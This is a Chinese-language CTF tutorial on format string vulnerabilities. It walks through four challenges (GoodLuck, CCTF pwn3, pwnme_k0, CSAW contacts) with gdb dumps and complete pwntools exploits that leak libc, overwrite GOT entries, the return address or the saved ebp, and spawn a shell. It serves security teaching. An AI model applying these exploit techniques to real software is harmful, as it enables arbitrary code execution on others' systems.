# 例子

下面會介紹一些 CTF 中的格式化漏洞的題目。也都是格式化字符串常見的利用。

## 64位程序格式化字符串漏洞

### 原理

其實 64 位的偏移計算和 32 位類似，都是算對應的參數。只不過 64 位函數的前 6 個參數是存儲在相應的寄存器中的。那麼在格式化字符串漏洞中呢？雖然我們並沒有向相應寄存器中放入數據，但是程序依舊會按照格式化字符串的相應格式對其進行解析。

### 例子

這裏，我們以 2017 年的 UIUCTF 中 [pwn200 GoodLuck](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck) 爲例進行介紹。這裏由於只有本地環境，所以我在本地設置了一個 flag.txt 文件。

#### 確定保護

```shell
➜  2017-UIUCTF-pwn200-GoodLuck git:(master) ✗ checksec goodluck
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

可以看出程序開啓了 NX 保護以及部分 RELRO 保護。

#### 分析程序

可以發現，程序的漏洞很明顯

```C
  for ( j = 0; j <= 21; ++j )
  {
    v5 = format[j];
    if ( !v5 || v11[j] != v5 )
    {
      puts("You answered:");
      printf(format);
      puts("\nBut that was totally wrong lol get rekt");
      fflush(_bss_start);
      result = 0;
      goto LABEL_11;
    }
  }
```

#### 確定偏移

我們在 printf 處下偏移如下,這裏只關注代碼部分與棧部分。

```shell
gef➤  b printf
Breakpoint 1 at 0x400640
gef➤  r
Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/2017-UIUCTF-pwn200-GoodLuck/goodluck 
what's the flag
123456
You answered:

Breakpoint 1, __printf (format=0x602830 "123456") at printf.c:28
28	printf.c: 沒有那個文件或目錄.

─────────────────────────────────────────────────────────[ code:i386:x86-64 ]────
   0x7ffff7a627f7 <fprintf+135>    add    rsp, 0xd8
   0x7ffff7a627fe <fprintf+142>    ret    
   0x7ffff7a627ff                  nop    
 → 0x7ffff7a62800 <printf+0>       sub    rsp, 0xd8
   0x7ffff7a62807 <printf+7>       test   al, al
   0x7ffff7a62809 <printf+9>       mov    QWORD PTR [rsp+0x28], rsi
   0x7ffff7a6280e <printf+14>      mov    QWORD PTR [rsp+0x30], rdx
───────────────────────────────────────────────────────────────────────[ stack ]────
['0x7fffffffdb08', 'l8']
8
0x00007fffffffdb08│+0x00: 0x0000000000400890  →  <main+234> mov edi, 0x4009b8	 ← $rsp
0x00007fffffffdb10│+0x08: 0x0000000031000001
0x00007fffffffdb18│+0x10: 0x0000000000602830  →  0x0000363534333231 ("123456"?)
0x00007fffffffdb20│+0x18: 0x0000000000602010  →  "You answered:\ng"
0x00007fffffffdb28│+0x20: 0x00007fffffffdb30  →  "flag{11111111111111111"
0x00007fffffffdb30│+0x28: "flag{11111111111111111"
0x00007fffffffdb38│+0x30: "11111111111111"
0x00007fffffffdb40│+0x38: 0x0000313131313131 ("111111"?)
──────────────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x7ffff7a62800 → Name: __printf(format=0x602830 "123456")
[#1] 0x400890 → Name: main()
─────────────────────────────────────────────────────────────────────────────────────────────────


```

可以看到 flag 對應的棧上的偏移爲 5，除去對應的第一行爲返回地址外，其偏移爲 4。此外，由於這是一個 64 位程序，所以前 6 個參數存在在對應的寄存器中，fmt 字符串存儲在 RDI 寄存器中，所以 fmt 字符串對應的地址的偏移爲 10。而 fmt 字符串中 `%order$s` 對應的 order 爲 fmt 字符串後面的參數的順序，所以我們只需要輸入 `%9$s` 即可得到 flag 的內容。當然，我們還有更簡單的方法利用 https://github.com/scwuaptx/Pwngdb 中的 fmtarg 來判斷某個參數的偏移。

```shell
gef➤  fmtarg 0x00007fffffffdb28
The index of format argument : 10
```

需要注意的是我們必須 break 在 printf 處。

#### 利用程序

```python
from pwn import *
from LibcSearcher import *
goodluck = ELF('./goodluck')
if args['REMOTE']:
    sh = remote('pwn.sniperoj.cn', 30017)
else:
    sh = process('./goodluck')
payload = "%9$s"
print payload
##gdb.attach(sh)
sh.sendline(payload)
print sh.recv()
sh.interactive()
```

## hijack GOT

### 原理

在目前的 C 程序中，libc 中的函數都是通過 GOT 表來跳轉的。此外，在沒有開啓 RELRO 保護的前提下，每個 libc 的函數對應的 GOT 表項是可以被修改的。因此，我們可以修改某個 libc 函數的 GOT 表內容爲另一個 libc 函數的地址來實現對程序的控制。比如說我們可以修改 printf 的 got 表項內容爲 system 函數的地址。從而，程序在執行 printf 的時候實際執行的是 system 函數。

假設我們將函數 A 的地址覆蓋爲函數 B 的地址，那麼這一攻擊技巧可以分爲以下步驟

-   確定函數 A 的 GOT 表地址。

    -   這一步我們利用的函數 A 一般在程序中已有，所以可以採用簡單的尋找地址的方法來找。

-   確定函數 B 的內存地址

    -   這一步通常來說，需要我們自己想辦法來泄露對應函數 B 的地址。

-   將函數B的內存地址寫入到函數 A 的 GOT 表地址處。

    -   這一步一般來說需要我們利用函數的漏洞來進行觸發。一般利用方法有如下兩種

        -   寫入函數：write 函數。
        -   ROP

        ```text
        pop eax; ret; 			# printf@got -> eax
        pop ebx; ret; 			# (addr_offset = system_addr - printf_addr) -> ebx
        add [eax] ebx; ret; 	# [printf@got] = [printf@got] + addr_offset
        ```

        -   格式化字符串任意地址寫

### 例子

這裏我們以 2016 CCTF 中的 [pwn3](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2016-CCTF-pwn3) 爲例進行介紹。

#### 確定保護

如下

```shell
➜  2016-CCTF-pwn3 git:(master) ✗ checksec pwn3 
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

可以看出程序主要開啓了 NX 保護。我們一般默認遠程都是開啓 ASLR 保護的。

#### 分析程序

首先分析程序，可以發現程序似乎主要實現了一個需密碼登錄的 ftp，具有 get，put，dir 三個基本功能。大概瀏覽一下每個功能的代碼，發現在 get 功能中存在格式化字符串漏洞

```C
int get_file()
{
  char dest; // [sp+1Ch] [bp-FCh]@5
  char s1; // [sp+E4h] [bp-34h]@1
  char *i; // [sp+10Ch] [bp-Ch]@3

  printf("enter the file name you want to get:");
  __isoc99_scanf("%40s", &s1);
  if ( !strncmp(&s1, "flag", 4u) )
    puts("too young, too simple");
  for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) )
  {
    if ( !strcmp(i, &s1) )
    {
      strcpy(&dest, i + 0x28);
      return printf(&dest);
    }
  }
  return printf(&dest);
}
```

#### 漏洞利用思路

既然有了格式化字符串漏洞，那麼我們可以確定如下的利用思路

- 繞過密碼
- 確定格式化字符串參數偏移
- 利用 put@got 獲取 put 函數地址，進而獲取對應的 libc.so 的版本，進而獲取對應 system 函數地址。
- 修改 puts@got 的內容爲 system 的地址。
- 當程序再次執行 puts 函數的時候，其實執行的是 system 函數。

#### 漏洞利用程序

如下

```python
from pwn import *
from LibcSearcher import LibcSearcher
##context.log_level = 'debug'
pwn3 = ELF('./pwn3')
if args['REMOTE']:
    sh = remote('111', 111)
else:
    sh = process('./pwn3')


def get(name):
    sh.sendline('get')
    sh.recvuntil('enter the file name you want to get:')
    sh.sendline(name)
    data = sh.recv()
    return data


def put(name, content):
    sh.sendline('put')
    sh.recvuntil('please enter the name of the file you want to upload:')
    sh.sendline(name)
    sh.recvuntil('then, enter the content:')
    sh.sendline(content)


def show_dir():
    sh.sendline('dir')


tmp = 'sysbdmin'
name = ""
for i in tmp:
    name += chr(ord(i) - 1)


## password
def password():
    sh.recvuntil('Name (ftp.hacker.server:Rainism):')
    sh.sendline(name)


##password
password()
## get the addr of puts
puts_got = pwn3.got['puts']
log.success('puts got : ' + hex(puts_got))
put('1111', '%8$s' + p32(puts_got))
puts_addr = u32(get('1111')[:4])

## get addr of system
libc = LibcSearcher("puts", puts_addr)
system_offset = libc.dump('system')
puts_offset = libc.dump('puts')
system_addr = puts_addr - puts_offset + system_offset
log.success('system addr : ' + hex(system_addr))

## modify puts@got, point to system_addr
payload = fmtstr_payload(7, {puts_got: system_addr})
put('/bin/sh;', payload)
sh.recvuntil('ftp>')
sh.sendline('get')
sh.recvuntil('enter the file name you want to get:')
##gdb.attach(sh)
sh.sendline('/bin/sh;')

## system('/bin/sh')
show_dir()
sh.interactive()
```

注意

- 我在獲取 puts 函數地址時使用的偏移是 8，這是因爲我希望我輸出的前 4 個字節就是 puts 函數的地址。其實格式化字符串的首地址的偏移是 7。
- 這裏我利用了 pwntools 中的 fmtstr\_payload 函數，比較方便獲取我們希望得到的結果，有興趣的可以查看官方文檔嘗試。比如這裏 fmtstr\_payload(7, {puts\_got: system\_addr}) 的意思就是，我的格式化字符串的偏移是 7，我希望在 puts\_got 地址處寫入 system\_addr 地址。默認情況下是按照字節來寫的。

## hijack retaddr

### 原理

很容易理解，我們要利用格式化字符串漏洞來劫持程序的返回地址到我們想要執行的地址。

### 例子

這裏我們以 [三個白帽-pwnme_k0](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/三個白帽-pwnme_k0) 爲例進行分析。

#### 確定保護

```shell
➜  三個白帽-pwnme_k0 git:(master) ✗ checksec pwnme_k0
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

可以看出程序主要開啓了 NX 保護以及 Full RELRO 保護。這我們就沒有辦法修改程序的 got 表了。

#### 分析程序

簡單分析一下，就知道程序似乎主要實現了一個類似賬戶註冊之類的功能，主要有修改查看功能，然後發現在查看功能中發現了格式化字符串漏洞

```C
int __usercall sub_400B07@<eax>(char format@<dil>, char formata, __int64 a3, char a4)
{
  write(0, "Welc0me to sangebaimao!\n", 0x1AuLL);
  printf(&formata, "Welc0me to sangebaimao!\n");
  return printf(&a4 + 4);
}
```

其輸出的內容爲 &a4 + 4。我們回溯一下，發現我們讀入的 password 內容也是

```C
    v6 = read(0, (char *)&a4 + 4, 0x14uLL);
```

當然我們還可以發現 username 和 password 之間的距離爲 20 個字節。

```C
  puts("Input your username(max lenth:20): ");
  fflush(stdout);
  v8 = read(0, &bufa, 0x14uLL);
  if ( v8 && v8 <= 0x14u )
  {
    puts("Input your password(max lenth:20): ");
    fflush(stdout);
    v6 = read(0, (char *)&a4 + 4, 0x14uLL);
    fflush(stdout);
    *(_QWORD *)buf = bufa;
    *(_QWORD *)(buf + 8) = a3;
    *(_QWORD *)(buf + 16) = a4;
```

好，這就差不多了。此外，也可以發現這個賬號密碼其實沒啥配對不配對的。

#### 利用思路

我們最終的目的是希望可以獲得系統的 shell，可以發現在給定的文件中，在 0x00000000004008A6 地址處有一個直接調用system('bin/sh') 的函數（關於這個的發現，一般都會現在程序大致看一下。）。那如果我們修改某個函數的返回地址爲這個地址，那就相當於獲得了 shell。

雖然存儲返回地址的內存本身是動態變化的，但是其相對於 rbp 的地址並不會改變，所以我們可以使用相對地址來計算。利用思路如下

- 確定偏移
- 獲取函數的 rbp 與返回地址
- 根據相對偏移獲取存儲返回地址的地址
- 將執行 system 函數調用的地址寫入到存儲返回地址的地址。

#### 確定偏移

首先，我們先來確定一下偏移。輸入用戶名 aaaaaaaa，密碼隨便輸入，斷點下在輸出密碼的那個 printf(&a4 + 4) 函數處

```text
Register Account first!
Input your username(max lenth:20): 
aaaaaaaa
Input your password(max lenth:20): 
%p%p%p%p%p%p%p%p%p%p
Register Success!!
1.Sh0w Account Infomation!
2.Ed1t Account Inf0mation!
3.QUit sangebaimao:(
>error options
1.Sh0w Account Infomation!
2.Ed1t Account Inf0mation!
3.QUit sangebaimao:(
>1
...
```

此時棧的情況爲

```text
─────────────────────────────────────────────────────────[ code:i386:x86-64 ]────
     0x400b1a                  call   0x400758
     0x400b1f                  lea    rdi, [rbp+0x10]
     0x400b23                  mov    eax, 0x0
 →   0x400b28                  call   0x400770
   ↳    0x400770                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc0
        0x400776                  xchg   ax, ax
        0x400778                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc8
        0x40077e                  xchg   ax, ax
────────────────────────────────────────────────────────────────────[ stack ]────
0x00007fffffffdb40│+0x00: 0x00007fffffffdb80  →  0x00007fffffffdc30  →  0x0000000000400eb0  →   push r15	 ← $rsp, $rbp
0x00007fffffffdb48│+0x08: 0x0000000000400d74  →   add rsp, 0x30
0x00007fffffffdb50│+0x10: "aaaaaaaa"	 ← $rdi
0x00007fffffffdb58│+0x18: 0x000000000000000a
0x00007fffffffdb60│+0x20: 0x7025702500000000
0x00007fffffffdb68│+0x28: "%p%p%p%p%p%p%p%pM\r@"
0x00007fffffffdb70│+0x30: "%p%p%p%pM\r@"
0x00007fffffffdb78│+0x38: 0x0000000000400d4d  →   cmp eax, 0x2
```

可以發現我們輸入的用戶名在棧上第三個位置，那麼除去本身格式化字符串的位置，其偏移爲爲 5 + 3 = 8。

#### 修改地址

我們再仔細觀察下斷點處棧的信息

```text
0x00007fffffffdb40│+0x00: 0x00007fffffffdb80  →  0x00007fffffffdc30  →  0x0000000000400eb0  →   push r15	 ← $rsp, $rbp
0x00007fffffffdb48│+0x08: 0x0000000000400d74  →   add rsp, 0x30
0x00007fffffffdb50│+0x10: "aaaaaaaa"	 ← $rdi
0x00007fffffffdb58│+0x18: 0x000000000000000a
0x00007fffffffdb60│+0x20: 0x7025702500000000
0x00007fffffffdb68│+0x28: "%p%p%p%p%p%p%p%pM\r@"
0x00007fffffffdb70│+0x30: "%p%p%p%pM\r@"
0x00007fffffffdb78│+0x38: 0x0000000000400d4d  →   cmp eax, 0x2
```

可以看到棧上第二個位置存儲的就是該函數的返回地址(其實也就是調用 show account 函數時執行 push rip 所存儲的值)，在格式化字符串中的偏移爲 7。

與此同時棧上，第一個元素存儲的也就是上一個函數的 rbp。所以我們可以得到偏移 0x00007fffffffdb80 - 0x00007fffffffdb48 = 0x38。繼而如果我們知道了 rbp 的數值，就知道了函數返回地址的地址。

0x0000000000400d74 與 0x00000000004008A6 只有低 2 字節不同，所以我們可以只修改 0x00007fffffffdb48 開始的 2 個字節。

這裏需要說明的是在某些較新的系統(如 ubuntu 18.04)上, 直接修改返回地址爲 0x00000000004008A6 時可能會發生程序 crash, 這時可以考慮修改返回地址爲 0x00000000004008AA,  即直接調用 system("/bin/sh") 處

```assembly
.text:00000000004008A6 sub_4008A6      proc near
.text:00000000004008A6 ; __unwind {
.text:00000000004008A6                 push    rbp
.text:00000000004008A7                 mov     rbp, rsp
.text:00000000004008AA <- here         mov     edi, offset command ; "/bin/sh"
.text:00000000004008AF                 call    system
.text:00000000004008B4                 pop     rdi
.text:00000000004008B5                 pop     rsi
.text:00000000004008B6                 pop     rdx
.text:00000000004008B7                 retn
```

#### 利用程序
```python
from pwn import *
context.log_level="debug"
context.arch="amd64"

sh=process("./pwnme_k0")
binary=ELF("pwnme_k0")
#gdb.attach(sh)

sh.recv()
sh.writeline("1"*8)
sh.recv()
sh.writeline("%6$p")
sh.recv()
sh.writeline("1")
sh.recvuntil("0x")
ret_addr = int(sh.recvline().strip(),16) - 0x38
success("ret_addr:"+hex(ret_addr))


sh.recv()
sh.writeline("2")
sh.recv()
sh.sendline(p64(ret_addr))
sh.recv()
#sh.writeline("%2214d%8$hn")
#0x4008aa-0x4008a6
sh.writeline("%2218d%8$hn")

sh.recv()
sh.writeline("1")
sh.recv()
sh.interactive()
```

## 堆上的格式化字符串漏洞

### 原理

所謂堆上的格式化字符串指的是格式化字符串本身存儲在堆上，這個主要增加了我們獲取對應偏移的難度，而一般來說，該格式化字符串都是很有可能被複制到棧上的。

### 例子

這裏我們以 2015 年 CSAW 中的 [contacts](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2015-CSAW-contacts) 爲例進行介紹。

#### 確定保護

```shell
➜  2015-CSAW-contacts git:(master) ✗ checksec contacts
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

可以看出程序不僅開啓了 NX 保護還開啓了 Canary。

#### 分析程序

簡單看看程序，發現程序正如名字所描述的，是一個聯繫人相關的程序，可以實現創建，修改，刪除，打印聯繫人的信息。而再仔細閱讀，可以發現在打印聯繫人信息的時候存在格式化字符串漏洞。

```C
int __cdecl PrintInfo(int a1, int a2, int a3, char *format)
{
  printf("\tName: %s\n", a1);
  printf("\tLength %u\n", a2);
  printf("\tPhone #: %s\n", a3);
  printf("\tDescription: ");
  return printf(format);
}
```

仔細看看，可以發現這個 format 其實是指向堆中的。

#### 利用思路

我們的基本目的是獲取系統的 shell，從而拿到 flag。其實既然有格式化字符串漏洞，我們應該是可以通過劫持got表或者控制程序返回地址來控制程序流程。但是這裏卻不怎麼可行。原因分別如下

- 之所以不能夠劫持 got 來控制程序流程，是因爲我們發現對於程序中常見的可以對於我們給定的字符串輸出的只有 printf 函數，我們只有選擇它纔可以構造 /bin/sh 讓它執行 system('/bin/sh')，但是 printf 函數在其他地方也均有用到，這樣做會使得程序直接崩潰。
- 其次，不能夠直接控制程序返回地址來控制程序流程的是因爲我們並沒有一塊可以直接執行的地址來存儲我們的內容，同時利用格式化字符串來往棧上直接寫入 system\_addr + 'bbbb' + addr of '/bin/sh‘ 似乎並不現實。


那麼我們可以怎麼做呢？我們還有之前在棧溢出講的技巧，stack pivoting。而這裏，我們可以控制的恰好是堆內存，所以我們可以把棧遷移到堆上去。這裏我們通過 leave 指令來進行棧遷移，所以在遷移之前我們需要修改程序保存 ebp 的值爲我們想要的值。 只有這樣在執行 leave 指令的時候， esp 纔會成爲我們想要的值。同時，因爲我們是使用格式化字符串來進行修改，所以我們得知道保存 ebp 的地址爲多少，而這時 PrintInfo 函數中存儲 ebp 的地址每次都在變化，而我們也無法通過其他方法得知。但是，**程序中壓入棧中的 ebp 值其實保存的是上一個函數的保存 ebp 值的地址**，所以我們可以修改其**上層函數的保存的 ebp 的值，即上上層函數（即main函數）的 ebp 數值**。這樣當上層程序返回時，即實現了將棧遷移到堆的操作。

基本思路如下

-   首先獲取 system 函數的地址
    -   通過泄露某個 libc 函數的地址根據 libc database 確定。
-   構造基本聯繫人描述爲 system\_addr + 'bbbb' + binsh\_addr
-   修改上層函數保存的 ebp(即上上層函數的 ebp)爲**存儲 system\_addr 的地址 -4**。
-   當主程序返回時，會有如下操作
    -   move esp,ebp，將 esp 指向 system\_addr 的地址-4
    -   pop ebp， 將 esp 指向 system\_addr
    -   ret，將 eip 指向 system\_addr，從而獲取 shell。

#### 獲取相關地址與偏移

這裏我們主要是獲取 system 函數地址、/bin/sh 地址，棧上存儲聯繫人描述的地址，以及 PrintInfo 函數的地址。

首先，我們根據棧上存儲的 libc\_start\_main\_ret 地址(該地址是當 main 函數執行返回時會運行的函數)來獲取 system 函數地址、/bin/sh 地址。我們構造相應的聯繫人，然後選擇輸出聯繫人信息，並將斷點下在 printf 處，並且一直運行到格式化字符串漏洞的 printf 函數處，如下

```shell
 → 0xf7e44670 <printf+0>       call   0xf7f1ab09 <__x86.get_pc_thunk.ax>
   ↳  0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
      0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret    
      0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
      0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret    
───────────────────────────────────────────────────────────────────────────────────────[ stack ]────
['0xffffccfc', 'l8']
8
0xffffccfc│+0x00: 0x08048c27  →   leave 	 ← $esp
0xffffcd00│+0x04: 0x0804c420  →  "1234567"
0xffffcd04│+0x08: 0x0804c410  →  "11111"
0xffffcd08│+0x0c: 0xf7e5acab  →  <puts+11> add ebx, 0x152355
0xffffcd0c│+0x10: 0x00000000
0xffffcd10│+0x14: 0xf7fad000  →  0x001b1db0
0xffffcd14│+0x18: 0xf7fad000  →  0x001b1db0
0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000	 ← $ebp
──────────────────────────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0xf7e44670 → Name: __printf(format=0x804c420 "1234567\n")
[#1] 0x8048c27 → leave 
[#2] 0x8048c99 → add DWORD PTR [ebp-0xc], 0x1
[#3] 0x80487a2 → jmp 0x80487b3
[#4] 0xf7e13637 → Name: __libc_start_main(main=0x80486bd, argc=0x1, argv=0xffffce14, init=0x8048df0, fini=0x8048e60, rtld_fini=0xf7fe88a0 <_dl_fini>, stack_end=0xffffce0c)
[#5] 0x80485e1 → hlt 
────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  dereference $esp 140
['$esp', '140']
1
0xffffccfc│+0x00: 0x08048c27  →   leave 	 ← $esp
gef➤  dereference $esp l140
['$esp', 'l140']
140
0xffffccfc│+0x00: 0x08048c27  →   leave 	 ← $esp
0xffffcd00│+0x04: 0x0804c420  →  "1234567"
0xffffcd04│+0x08: 0x0804c410  →  "11111"
0xffffcd08│+0x0c: 0xf7e5acab  →  <puts+11> add ebx, 0x152355
0xffffcd0c│+0x10: 0x00000000
0xffffcd10│+0x14: 0xf7fad000  →  0x001b1db0
0xffffcd14│+0x18: 0xf7fad000  →  0x001b1db0
0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000	 ← $ebp
0xffffcd1c│+0x20: 0x08048c99  →   add DWORD PTR [ebp-0xc], 0x1
0xffffcd20│+0x24: 0x0804b0a8  →  "11111"
0xffffcd24│+0x28: 0x00002b67 ("g+"?)
0xffffcd28│+0x2c: 0x0804c410  →  "11111"
0xffffcd2c│+0x30: 0x0804c420  →  "1234567"
0xffffcd30│+0x34: 0xf7fadd60  →  0xfbad2887
0xffffcd34│+0x38: 0x08048ed6  →  0x25007325 ("%s"?)
0xffffcd38│+0x3c: 0x0804b0a0  →  0x0804c420  →  "1234567"
0xffffcd3c│+0x40: 0x00000000
0xffffcd40│+0x44: 0xf7fad000  →  0x001b1db0
0xffffcd44│+0x48: 0x00000000
0xffffcd48│+0x4c: 0xffffcd78  →  0x00000000
0xffffcd4c│+0x50: 0x080487a2  →   jmp 0x80487b3
0xffffcd50│+0x54: 0x0804b0a0  →  0x0804c420  →  "1234567"
0xffffcd54│+0x58: 0xffffcd68  →  0x00000004
0xffffcd58│+0x5c: 0x00000050 ("P"?)
0xffffcd5c│+0x60: 0x00000000
0xffffcd60│+0x64: 0xf7fad3dc  →  0xf7fae1e0  →  0x00000000
0xffffcd64│+0x68: 0x08048288  →  0x00000082
0xffffcd68│+0x6c: 0x00000004
0xffffcd6c│+0x70: 0x0000000a
0xffffcd70│+0x74: 0xf7fad000  →  0x001b1db0
0xffffcd74│+0x78: 0xf7fad000  →  0x001b1db0
0xffffcd78│+0x7c: 0x00000000
0xffffcd7c│+0x80: 0xf7e13637  →  <__libc_start_main+247> add esp, 0x10
0xffffcd80│+0x84: 0x00000001
0xffffcd84│+0x88: 0xffffce14  →  0xffffd00d  →  "/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/201[...]"
0xffffcd88│+0x8c: 0xffffce1c  →  0xffffd058  →  "XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]"
```

我們可以通過簡單的判斷可以得到

```
0xffffcd7c│+0x80: 0xf7e13637  →  <__libc_start_main+247> add esp, 0x10
```

存儲的是__libc_start_main的返回地址，同時利用 fmtarg 來獲取對應的偏移，可以看出其偏移爲 32，那麼相對於格式化字符串的偏移爲 31。

```shell
gef➤  fmtarg 0xffffcd7c
The index of format argument : 32
```

這樣我們便可以得到對應的地址了。進而可以根據 libc-database 來獲取對應的 libc，繼而獲取 system 函數地址與 /bin/sh 函數地址了。

其次，我們可以確定棧上存儲格式化字符串的地址 0xffffcd2c 相對於格式化字符串的偏移爲 11，得到這個是爲了尋址堆中指定聯繫人的Description的內存首地址，我們將格式化字符串[system_addr][bbbb][binsh_addr][%6$p][%11$p][bbbb]保存在指定聯繫人的Description中。

再者，我們可以看出下面的地址保存着上層函數的調用地址，其相對於格式化字符串的偏移爲 6，這樣我們可以直接修改上層函數存儲的 ebp 的值。

```shell
0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000	 ← $ebp
```

#### 構造聯繫人獲取堆地址

得知上面的信息後，我們可以利用下面的方式獲取堆地址與相應的 ebp 地址。

```text
[system_addr][bbbb][binsh_addr][%6$p][%11$p][bbbb]
```

來獲取對應的相應的地址。後面的 bbbb 是爲了接受字符串方便。

這裏因爲函數調用時所申請的棧空間與釋放的空間是一致的，所以我們得到的 ebp 地址並不會因爲我們再次調用而改變。

在部分環境下，system地址會出現\x00，導致printf的時候出現0截斷導致無法泄露兩個地址，因此可以將payload的修改如下：

```text
[%6$p][%11$p][ccc][system_addr][bbbb][binsh_addr][dddd]
```

payload修改爲這樣的話，還需要在heap上加入12的偏移。這樣保證了0截斷出現在泄露之後。

#### 修改ebp

由於我們需要執行 move 指令將 ebp 賦給 esp，並還需要執行 pop ebp 纔會執行 ret 指令，所以我們需要將 ebp 修改爲存儲 system 地址 -4 的值。這樣 pop ebp 之後，esp 恰好指向保存 system 的地址，這時在執行 ret 指令即可執行 system 函數。

上面已經得知了我們希望修改的 ebp 值，而也知道了對應的偏移爲 6，所以我們可以構造如下的 payload 來進行修改相應的值。

```
part1 = (heap_addr - 4) / 2
part2 = heap_addr - 4 - part1
payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'
```

#### 獲取shell

這時，執行完格式化字符串函數之後，退出到上上函數，我們輸入 5，退出程序即會執行 ret 指令，就可以獲取 shell。

#### 利用程序

```python
from pwn import *
from LibcSearcher import *
contact = ELF('./contacts')
##context.log_level = 'debug'
if args['REMOTE']:
    sh = remote(11, 111)
else:
    sh = process('./contacts')


def createcontact(name, phone, descrip_len, description):
    sh.recvuntil('>>> ')
    sh.sendline('1')
    sh.recvuntil('Contact info: \n')
    sh.recvuntil('Name: ')
    sh.sendline(name)
    sh.recvuntil('You have 10 numbers\n')
    sh.sendline(phone)
    sh.recvuntil('Length of description: ')
    sh.sendline(descrip_len)
    sh.recvuntil('description:\n\t\t')
    sh.sendline(description)


def printcontact():
    sh.recvuntil('>>> ')
    sh.sendline('4')
    sh.recvuntil('Contacts:')
    sh.recvuntil('Description: ')


## get system addr & binsh_addr
payload = '%31$paaaa'
createcontact('1111', '1111', '111', payload)
printcontact()
libc_start_main_ret = int(sh.recvuntil('aaaa', drop=True), 16)
log.success('get libc_start_main_ret addr: ' + hex(libc_start_main_ret))
libc = LibcSearcher('__libc_start_main_ret', libc_start_main_ret)
libc_base = libc_start_main_ret - libc.dump('__libc_start_main_ret')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
log.success('get system addr: ' + hex(system_addr))
log.success('get binsh addr: ' + hex(binsh_addr))
##gdb.attach(sh)

## get heap addr and ebp addr
payload = flat([
    system_addr,
    'bbbb',
    binsh_addr,
    '%6$p%11$pcccc',
])
createcontact('2222', '2222', '222', payload)
printcontact()
sh.recvuntil('Description: ')
data = sh.recvuntil('cccc', drop=True)
data = data.split('0x')
print data
ebp_addr = int(data[1], 16)
heap_addr = int(data[2], 16)

## modify ebp
part1 = (heap_addr - 4) / 2
part2 = heap_addr - 4 - part1
payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'
##print payload
createcontact('3333', '123456789', '300', payload)
printcontact()
sh.recvuntil('Description: ')
sh.recvuntil('Description: ')
##gdb.attach(sh)
print 'get shell'
sh.recvuntil('>>> ')
##get shell
sh.sendline('5')
sh.interactive()
```
system出現0截斷的情況下，exp如下:
```python
from pwn import *
context.log_level="debug"
context.arch="x86"

io=process("./contacts")
binary=ELF("contacts")
libc=binary.libc

def createcontact(io, name, phone, descrip_len, description):
	sh=io
	sh.recvuntil('>>> ')
	sh.sendline('1')
	sh.recvuntil('Contact info: \n')
	sh.recvuntil('Name: ')
	sh.sendline(name)
	sh.recvuntil('You have 10 numbers\n')
	sh.sendline(phone)
	sh.recvuntil('Length of description: ')
	sh.sendline(descrip_len)
	sh.recvuntil('description:\n\t\t')
	sh.sendline(description)
def printcontact(io):
	sh=io
	sh.recvuntil('>>> ')
	sh.sendline('4')
	sh.recvuntil('Contacts:')
	sh.recvuntil('Description: ')

#gdb.attach(io)

createcontact(io,"1","1","111","%31$paaaa")
printcontact(io)
libc_start_main = int(io.recvuntil('aaaa', drop=True), 16)-241
log.success('get libc_start_main addr: ' + hex(libc_start_main))
libc_base=libc_start_main-libc.symbols["__libc_start_main"]
system=libc_base+libc.symbols["system"]
binsh=libc_base+next(libc.search("/bin/sh"))
log.success("system: "+hex(system))
log.success("binsh: "+hex(binsh))

payload = '%6$p%11$pccc'+p32(system)+'bbbb'+p32(binsh)+"dddd"
createcontact(io,'2', '2', '111', payload)
printcontact(io)
io.recvuntil('Description: ')
data = io.recvuntil('ccc', drop=True)
data = data.split('0x')
print data
ebp_addr = int(data[1], 16)
heap_addr = int(data[2], 16)+12
log.success("ebp: "+hex(system))
log.success("heap: "+hex(heap_addr))

part1 = (heap_addr - 4) / 2
part2 = heap_addr - 4 - part1
payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'

#payload=fmtstr_payload(6,{ebp_addr:heap_addr})
##print payload
createcontact(io,'3333', '123456789', '300', payload)
printcontact(io)
io.recvuntil('Description: ')
io.recvuntil('Description: ')
##gdb.attach(sh)
log.success("get shell")
io.recvuntil('>>> ')
##get shell
io.sendline('5')
io.interactive()
```

需要注意的是，這樣並不能穩定得到 shell，因爲我們一次性輸入了太長的字符串。但是我們又沒有辦法在前面控制所想要輸入的地址。只能這樣了。

